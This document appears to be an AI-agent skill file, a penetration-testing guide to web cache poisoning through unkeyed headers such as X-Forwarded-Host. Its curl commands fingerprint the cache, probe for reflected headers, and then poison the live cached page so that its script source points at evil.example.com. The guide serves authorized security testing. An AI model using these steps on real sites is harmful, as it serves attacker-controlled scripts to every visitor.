---
name: performing-web-cache-poisoning-attack
description: "Exploits web cache mechanisms to serve malicious content. Signals: web vulnerabilities, injection, SQL injection."
zh-signals: "Exploiting web cache mechanisms to serve malicious content to other users 信号:web漏洞,注入,sql注入。"
when-to-use: Exploiting web cache mechanisms to serve malicious content to other users
  by poisoning cached responses through unkeyed headers and parameters during authorized
  security tests.
domain: cybersecurity
subdomain: web-application-security
tags:
- penetration-testing
- cache-poisoning
- web-security
- cdn
- burpsuite
- owasp
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
mitre_attack:
- T1190
- T1059.007
- T1505.003
- T1083
---

# Performing Web Cache Poisoning Attack

## When to Use

- During authorized penetration tests when the application uses CDN or reverse proxy caching (Cloudflare, Akamai, Varnish, Nginx)
- When assessing web applications for cache-based vulnerabilities that could affect all users
- For testing whether unkeyed HTTP headers are reflected in cached responses
- When evaluating cache key behavior and cache deception vulnerabilities
- During security assessments of applications with aggressive caching policies

## Prerequisites

- **Authorization**: Written penetration testing agreement explicitly covering cache poisoning testing
- **Burp Suite Professional**: With Param Miner extension for automated unkeyed header discovery
- **curl**: For manual cache testing with precise header control
- **Target knowledge**: Understanding of the caching layer (CDN provider, cache headers)
- **Cache buster**: Unique query parameter to isolate test requests from other users
- **Caution**: Cache poisoning affects all users; test with cache-busting parameters first


> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## Workflow

### Step 1: Identify the Caching Layer and Behavior

Determine what caching infrastructure is in use and how the cache key is constructed.

```bash
# Check cache-related response headers
curl -s -I "https://target.example.com/" | grep -iE \
  "(cache-control|x-cache|cf-cache|age|vary|x-varnish|x-served-by|cdn|via)"

# Common cache indicators:
# X-Cache: HIT / MISS
# CF-Cache-Status: HIT / MISS / DYNAMIC (Cloudflare)
# Age: 120 (seconds since cached)
# X-Varnish: 12345 67890 (Varnish)
# Via: 1.1 varnish (Varnish/CDN proxy)

# Determine cache key by testing variations
# Cache key typically includes: Host + Path + Query string

# Test 1: Same URL, two requests - check if second is cached
curl -s -I "https://target.example.com/page?cachebuster=test1" | grep -i "x-cache"
curl -s -I "https://target.example.com/page?cachebuster=test1" | grep -i "x-cache"
# First: MISS, Second: HIT = caching is active

# Test 2: Vary header behavior
curl -s -I "https://target.example.com/" | grep -i "vary"
# Vary: Accept-Encoding means Accept-Encoding is part of cache key
```

### Step 2: Discover Unkeyed Inputs with Param Miner

Use Burp's Param Miner to find headers and parameters not included in the cache key but reflected in responses.

```
# In Burp Suite:
# 1. Install Param Miner from BApp Store
# 2. Right-click target request > Extensions > Param Miner > Guess headers
# 3. Param Miner will test hundreds of HTTP headers
# 4. Check results in Extender > Extensions > Param Miner > Output

# Common unkeyed headers to test manually:
# X-Forwarded-Host, X-Forwarded-Scheme, X-Forwarded-Proto
# X-Original-URL, X-Rewrite-URL
# X-Host, X-Forwarded-Server
# Origin, Referer
# X-Forwarded-For, True-Client-IP
```

```bash
# Manual testing for unkeyed header reflection
# Add cache buster to isolate testing
CB="cachebuster=$(date +%s)"

# Test X-Forwarded-Host reflection
curl -s -H "X-Forwarded-Host: evil.example.com" \
  "https://target.example.com/?$CB" | grep "evil.example.com"

# Test X-Forwarded-Scheme
curl -s -H "X-Forwarded-Scheme: nothttps" \
  "https://target.example.com/?$CB" | grep "nothttps"

# Test X-Original-URL (path override)
curl -s -H "X-Original-URL: /admin" \
  "https://target.example.com/?$CB"

# Test X-Forwarded-Proto
curl -s -H "X-Forwarded-Proto: http" \
  "https://target.example.com/?$CB" | grep "http://"
```

### Step 3: Exploit Unkeyed Header for Cache Poisoning

Craft requests that poison cached responses with malicious content.

```bash
# Scenario: X-Forwarded-Host reflected in resource URLs
# Normal response includes: <script src="https://target.example.com/app.js">
# Poisoned: <script src="https://evil.example.com/app.js">

# Step 1: Confirm reflection with cache buster
curl -s -H "X-Forwarded-Host: evil.example.com" \
  "https://target.example.com/?cb=unique123" | \
  grep "evil.example.com"

# Step 2: Poison the actual cached page (WITHOUT cache buster)
# WARNING: This affects all users - only do with explicit authorization
curl -s -H "X-Forwarded-Host: evil.example.com" \
  "https://target.example.com/"

# Step 3: Verify cache is poisoned
curl -s "https://target.example.com/" | grep "evil.example.com"
# If evil.example.com appears, the cache is poisoned

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
